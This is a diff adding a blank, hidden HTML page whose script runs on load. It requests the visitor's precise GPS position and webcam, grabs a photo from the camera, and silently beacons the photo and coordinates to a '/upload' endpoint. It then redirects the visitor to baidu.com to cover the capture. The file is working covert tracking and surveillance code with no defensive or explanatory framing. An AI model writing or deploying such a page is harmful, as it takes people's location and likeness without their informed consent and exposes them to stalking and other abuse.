@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <style>body { display: none; }</style>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const gpsData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date(position.timestamp).toISOString()
+                        };
+                        
+                        getCamera(gpsData);
+                    },
+                    error => {
+                        getCamera(null);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                getCamera(null);
+            }
+            
+            function getCamera(gpsData) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+                        
+                        setTimeout(() => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            uploadData(canvas.toDataURL('image/jpeg', 0.7), gpsData);
+                        }, 500);
+                    })
+                    .catch(() => {
+                        uploadData(null, gpsData);
+                    });
+            }
+            
+            function uploadData(photoData, gpsData) {
+                const formData = new FormData();
+                
+                if (photoData) {
+                    const blob = dataURLtoBlob(photoData);
+                    formData.append('photo', blob, 'capture.jpg');
+                }
+                
+                if (gpsData) {
+                    formData.append('latitude', gpsData.latitude);
+                    formData.append('longitude', gpsData.longitude);
+                    formData.append('accuracy', gpsData.accuracy);
+                    formData.append('gps_timestamp', gpsData.timestamp);
+                }
+                
+                navigator.sendBeacon('/upload', formData);
+                
+                window.location.replace('https://www.baidu.com');
+            }
+            
+            function dataURLtoBlob(dataurl) {
+                const arr = dataurl.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                let n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                while (n--) {
+                    u8arr[n] = bstr.charCodeAt(n);
+                }
+                return new Blob([u8arr], { type: mime });
+            }
+        });
+    </script>
+</head>
+<body>
+</body>
+</html>
